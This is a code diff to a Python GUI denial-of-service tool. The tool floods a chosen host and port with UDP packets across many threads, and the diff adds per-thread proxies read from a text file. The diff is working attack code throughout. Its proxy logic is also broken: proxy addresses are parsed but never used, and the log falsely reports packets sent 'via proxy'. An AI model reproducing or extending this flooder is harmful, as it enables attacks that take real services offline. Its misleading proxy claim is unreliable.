@@ -1,27 +1,40 @@
 from tkinter import *
 import socket
 import random
-from threading import Thread
 import time
+from threading import Thread
 
 requests = 0
 packet = None
+proxies = []
 
 def on_error(message):
     start_stop_Button.set("Start Attack...")
     Status.set(message)
 
-def dos():
+def load_proxies():
+    global proxies
+    with open("http.txt", "r") as file:
+        proxies = file.readlines()
+    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
+
+def dos(proxy):
     global requests, packet
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        proxy_ip, proxy_port = proxy.split(':')
+        proxy_port = int(proxy_port)
+
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind(('', 0))
+
         while start_stop_Button.get() == "Stop Attack...":
             sock.sendto(packet, (Host.get(), int(Port.get())))
             requests += 1
-            print(f"Packet {requests} sent to {Host.get()}:{Port.get()}")
+            print(f"Packet {requests} sent to {Host.get()}:{Port.get()} via proxy {proxy_ip}:{proxy_port}")
             time.sleep(0.001)
     except Exception as e:
-        on_error(f"Error during Attack: {e}")
+        on_error(f"Error during Attack with proxy {proxy}: {e}")
 
 def main():
     global requests, packet
@@ -43,8 +56,10 @@ def main():
             start_stop_Button.set("Stop Attack...")
             Status.set("Attack started...")
 
-            for _ in range(thread_count):
-                Thread(target=dos, daemon=True).start()
+            load_proxies()
+
+            for i in range(min(thread_count, len(proxies))):
+                Thread(target=dos, args=(proxies[i],), daemon=True).start()
 
             update_status()
 
